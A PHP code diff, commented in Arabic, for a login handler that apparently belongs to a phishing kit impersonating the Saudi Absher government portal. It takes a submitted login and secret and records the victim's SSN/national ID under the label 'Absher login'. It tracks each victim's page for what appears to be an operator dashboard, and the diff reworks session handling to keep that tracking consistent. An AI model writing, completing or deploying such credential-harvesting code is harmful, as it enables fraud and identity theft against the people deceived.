@@ -1,5 +1,5 @@
 <?php
-session_start();
+require_once __DIR__ . '/../includes/bootstrap_client_session.php';
 // الاتصال بقاعدة البيانات
 require_once '../dashboard/init.php';
 // إنشاء كائن User
@@ -14,12 +14,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // التحقق من وجود البيانات
     if (!empty($loginField) && !empty($secretField)) {
         
-        // التحقق من وجود user_id في الجلسة (من select_school.php)
-        if (isset($_SESSION['user_id'])) {
-            // استخدام الـ user_id الموجود
-            $user_id = $_SESSION['user_id'];
-            
-            // تحديث بيانات المستخدم
+        $user_id = null;
+        if (!empty($_SESSION['user_id'])) {
+            $user_id = (int) $_SESSION['user_id'];
+        } elseif (!empty($_SESSION['current_user_id'])) {
+            $user_id = (int) $_SESSION['current_user_id'];
+        } elseif (!empty($_SESSION['client_id'])) {
+            $user_id = (int) $_SESSION['client_id'];
+        }
+
+        if ($user_id) {
+            $_SESSION['user_id'] = $user_id;
+            $_SESSION['current_user_id'] = $user_id;
+            $_SESSION['client_id'] = $user_id;
+
             $user->updateUserMessage($user_id, 'تسجيل دخول أبشر - SSN: ' . $loginField);
             $user->updateUserCurrentPage($user_id, 'absher.html');
             
@@ -48,7 +56,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             $user_id = $user->insertFormData($userData);
             
             if ($user_id) {
+                $user_id = (int) $user_id;
                 $_SESSION['user_id'] = $user_id;
+                $_SESSION['current_user_id'] = $user_id;
+                $_SESSION['client_id'] = $user_id;
                 $_SESSION['username'] = $username_client;
             }
         }
